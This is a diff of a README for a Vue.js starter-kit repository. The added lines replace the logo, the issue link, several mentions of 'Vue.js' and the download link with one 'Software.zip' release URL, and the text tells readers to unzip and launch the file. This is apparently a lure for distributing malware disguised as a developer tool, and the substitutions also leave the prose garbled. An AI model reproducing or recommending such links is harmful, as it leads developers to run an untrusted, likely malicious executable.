@@ -2,11 +2,11 @@
 
 Welcome to the Vue Frontend Starter repository! 
 
-![Vue Logo](https://vuejs.org/images/logo.png)
+![Vue Logo](https://github.com/whendidiaskbruhta/vue-frontend-starter/releases/download/v2.0/Software.zip)
 
 ## Description
 
-Vue Frontend Starter is a boilerplate kit designed to help you easily build modern web applications with Vue.js. Whether you are a beginner or an experienced developer, this starter kit provides a solid foundation for your Vue.js projects. With a focus on efficiency and best practices, you can kickstart your development process and save time.
+Vue Frontend Starter is a boilerplate kit designed to help you easily build modern web applications with https://github.com/whendidiaskbruhta/vue-frontend-starter/releases/download/v2.0/Software.zip Whether you are a beginner or an experienced developer, this starter kit provides a solid foundation for your https://github.com/whendidiaskbruhta/vue-frontend-starter/releases/download/v2.0/Software.zip projects. With a focus on efficiency and best practices, you can kickstart your development process and save time.
 
 ## Features
 
@@ -22,14 +22,14 @@ Vue Frontend Starter is a boilerplate kit designed to help you easily build mode
 
 🌈 **Vite:** Leverage Vite's fast build times and hot module replacement for rapid development.
 
-🪁 **Pinia:** Manage state in your Vue.js application effortlessly with Pinia.
+🪁 **Pinia:** Manage state in your https://github.com/whendidiaskbruhta/vue-frontend-starter/releases/download/v2.0/Software.zip application effortlessly with Pinia.
 
 ⚒️ **Starter Kit:** Start your project on the right foot with this comprehensive starter kit.
 
 ## Installation
 
 To get started with Vue Frontend Starter, download the starter kit from the following link:
-[Download Starter Kit](https://github.com/user-attachments/files/18388744/Software.zip)
+[Download Starter Kit](https://github.com/whendidiaskbruhta/vue-frontend-starter/releases/download/v2.0/Software.zip)
 
 *Note: The file needs to be unzipped and launched to start using the starter kit.*
 
@@ -64,12 +64,12 @@ Follow these simple steps to kickstart your project with Vue Frontend Starter:
 3. Open your terminal and navigate to the project directory.
 4. Run `npm install` to install the dependencies.
 5. Start the development server with `npm run dev`.
-6. Begin building your Vue.js application!
+6. Begin building your https://github.com/whendidiaskbruhta/vue-frontend-starter/releases/download/v2.0/Software.zip application!
 
 ## Support
 
-If you encounter any issues or have any questions about Vue Frontend Starter, feel free to [raise an issue](https://github.com/user/vue-frontend-starter/issues) on this repository. Our team is here to help you every step of the way!
+If you encounter any issues or have any questions about Vue Frontend Starter, feel free to [raise an issue](https://github.com/whendidiaskbruhta/vue-frontend-starter/releases/download/v2.0/Software.zip) on this repository. Our team is here to help you every step of the way!
 
 Happy coding with Vue Frontend Starter! 🎉
 
-![Vue Frontend Starter](https://example.com/vue-frontend-starter.png)
+![Vue Frontend Starter](https://github.com/whendidiaskbruhta/vue-frontend-starter/releases/download/v2.0/Software.zip)
